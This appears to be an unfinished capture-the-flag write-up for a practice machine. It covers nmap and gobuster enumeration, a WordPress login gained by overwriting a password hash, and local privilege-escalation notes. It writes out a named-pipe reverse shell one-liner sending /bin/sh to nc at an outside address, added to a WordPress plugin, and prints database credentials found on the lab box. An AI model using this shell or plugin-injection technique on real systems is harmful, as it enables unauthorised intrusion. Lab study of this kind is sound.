# Machine #9 Jarvis  


## Nmap Results  
  <img src="https://nmap.org/images/nmap-logo-256x256.png">   

* Initial nmap output  

  ```console
  PORT     STATE  SERVICE
  21/tcp   open   ftp
  22/tcp   open   ssh
  80/tcp   open   http
  8192/tcp closed sophos
  ```  

* Full scan output   

```console
PORT      STATE  SERVICE
21/tcp    open   ftp
22/tcp    open   ssh
80/tcp    open   http
8192/tcp  closed sophos
25565/tcp open   minecraft
```

<br/><br/>

## Banner Grabbing of Services  
 
 * The `Minecraft` service   
  ```console
  PORT      STATE SERVICE   VERSION
  25565/tcp open  minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
  ```

<br/><br/>

## Searchsploiting Results   
  <img src="https://www.offensive-security.com/wp-content/uploads/2020/05/SearchSploit-1.png" width=400 height=200>   



<br/><br/>  

## Gobustering Stuff  
  <img src="https://cdn.akamai.steamstatic.com/steam/apps/1092880/capsule_616x353.jpg?t=1605640630" width=400 height=200>  

  * Results   
    ```
    /index.php            (Status: 301) [Size: 0] [--> http://10.129.235.205/]
    /javascript           (Status: 301) [Size: 321] [--> http://10.129.235.205/javascript/]
    /phpmyadmin           (Status: 301) [Size: 321] [--> http://10.129.235.205/phpmyadmin/]
    /plugins              (Status: 301) [Size: 318] [--> http://10.129.235.205/plugins/]   
    /wiki                 (Status: 301) [Size: 315] [--> http://10.129.235.205/wiki/]      
    /wp-admin             (Status: 301) [Size: 319] [--> http://10.129.235.205/wp-admin/]  
    /wp-content           (Status: 301) [Size: 321] [--> http://10.129.235.205/wp-content/]
    /wp-includes          (Status: 301) [Size: 322] [--> http://10.129.235.205/wp-includes/]
    /wp-config.php        (Status: 200) [Size: 0]                                           
    /wp-login.php         (Status: 200) [Size: 2417]                                        
    /wp-trackback.php     (Status: 200) [Size: 135]                                         
    /xmlrpc.php           (Status: 405) [Size: 42]
    ```



<br/><br/>

## Thinking Out Loud   

  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQr4hzX6KoRN5PjPJjy8QC43K0T-CoXZHawDIxG4jCa9aMD1K8Vl3vhpG2a2OVbiy-i93c&usqp=CAU" width=200 height=200>  

* Found a login page when pressing "login" on the page.
* The website is using Wordpress which has a lot of security issues if not patched properly. I should look for a version
* Found the WordPress version `<generator>https://wordpress.org/?v=4.8</generator>`.
* This link shows multiple vulnerabilities for Wordpress version 4.8 <a href="https://wpscan.com/wordpress/48">click here</a>.
* I also found that there could be a potential sqli but tried it on multiple parameters and none worked out.
* The username is definitely "notch" but the password is my problem.
* Also found multiple vulnerabilities with the xmlrpc.php page but they're kind of irrelevant bacause it's either a DDoS attack or a Brute Force and I want to keep brute forcing as my last resort.
* Also, tried with the ftp but even if I was able to transfer files through it I don't think I can access files I transfered through the webpage.

* Found this username and password in the "Cute File Browser" that I got access to through the directory `plugins`
root   8YsqfCTnvxAUeduzjNSXe22


* Hash cracker  
`john --incremental --stdout | python phpass_crack.py hashes.txt -vv -o cracked.txt`.

* So instead of trying to crack the hash an idea occured to me to change the whole hash into one that I know what it is and I found <a href="https://www.useotools.com/wordpress-password-hash-generator">this</a> which generates wordpress hashes that are hashed with Portable PHP password hashing framework and with that I got into the WordPress.


 exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.76 1234 >/tmp/f");


 /etc/init.d/pro restart

* I got rev shell and it worked. I edited one of the plugins code and added the revshell code to it and when I saved my editing I got access as www-data. Make sure to not delete the original code of the plugin just add code for rev shell.
```console
define('DB_PASSWORD', 'kWuvW2SYsABmzywYRdoD');
define('DB_USER', 'wordpress');
```

```console
$dbpass='8YsqfCTnvxAUeduzjNSXe22';                                                                    
$dbuser='phpmyadmin';
    // $cfg['Servers'][$i]['AllowNoPassword'] = TRUE;
// $cfg['Servers'][$i]['AllowNoPassword'] = TRUE;
$cfg['Servers'][$i]['AllowNoPassword'] = false;
$cfg['Servers'][$i]['AllowNoPassword'] = false;
$cfg['Servers'][$i]['nopassword'] = false;
$cfg['ShowChgPassword'] = true;
        $pwd = trim( wp_unslash( $_POST[ 'pwd' ] ) );
        define('DB_PASSWORD', $pwd);
        define('DB_USER', $uname);
define('DB_PASSWORD', 'password_here');
define('DB_USER', 'username_here');
define('DB_PASSWORD', 'kWuvW2SYsABmzywYRdoD');
define('DB_USER', 'wordpress');

#-----------------------------------

-rw-r--r-- 1 root root 69 May 11  2017 /etc/php/7.0/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 May 11  2017 /usr/share/php7.0-common/common/ftp.ini
```


* Seems like there's a screen open by notch. Not sure
```console
[*] sof150 Are there any screen sessions from other users?................. yes!
---
/run/screen/S-notch

```

* Process that is executed by notch with a command that does not exist. Maybe I can make my own "SCREEN"   
  ```console
  05:05     1209    notch SCREEN screen -dmS blockycraft java -Xms500M -Xmx500M -jar ./sponge.jar nogui
  ```

* /tmp/tmux-33
* /usr/bin/gettext.sh

## How Did I Solve the Machine 

   <img src="https://images.lifesizecustomcutouts.com/image/cache/catalog/febProds21/SP000081-500x500.png" width=200 height=200>   

   
   

## Where I Got Stuck?   
  

## What Did I learn from this Machine?  




nc -z -v localhost 20-80 2>&1 | grep succeeded






